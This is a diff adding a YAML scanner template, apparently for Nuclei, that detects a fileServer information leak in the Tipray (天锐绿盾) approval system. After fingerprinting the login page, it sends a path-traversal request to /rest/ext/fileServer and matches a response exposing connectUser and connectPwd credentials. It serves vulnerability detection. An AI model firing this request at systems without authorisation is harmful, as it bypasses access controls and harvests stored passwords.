@@ -1,0 +1,54 @@
+id: poc-yaml-tipray-gsas-fileserver-info-leak
+info:
+  name: 天锐绿盾审批系统 fileServer 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+  description: |
+    This template checks for information leakage in the 天锐绿盾审批系统 fileServer endpoint.
+
+http:
+  - raw:
+      - |
+        GET /trwfe/login.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "天锐绿盾审批系统"
+        part: body
+
+  - raw:
+      - |
+        GET /trwfe/login.jsp/.%2e/rest/ext/fileServer HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"name\":"
+          - "\"connectUser\":"
+          - "\"otherAddrs\":"
+        part: body
+      - type: regex
+        regex:
+          - "\"connectPwd\":\"([a-z0-9]+)\""
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
